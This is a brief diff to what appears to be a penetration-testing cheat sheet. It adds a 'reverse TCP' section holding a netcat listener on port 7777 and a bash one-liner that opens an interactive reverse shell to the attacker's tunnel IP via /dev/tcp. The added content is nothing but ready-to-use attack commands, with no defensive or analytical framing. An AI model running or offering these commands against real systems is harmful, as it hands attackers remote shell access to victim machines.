@@ -20,3 +20,12 @@ Management\job.bat
 ```bash
 nc -lvnp {port}
 ```
+
+## reverse TCP
+
+```bash
+nc -lvnp 7777
+```
+``` bash
+bash -c "bash -i >& /dev/tcp/{tun 0 ip}/7777 0>&1"
+```
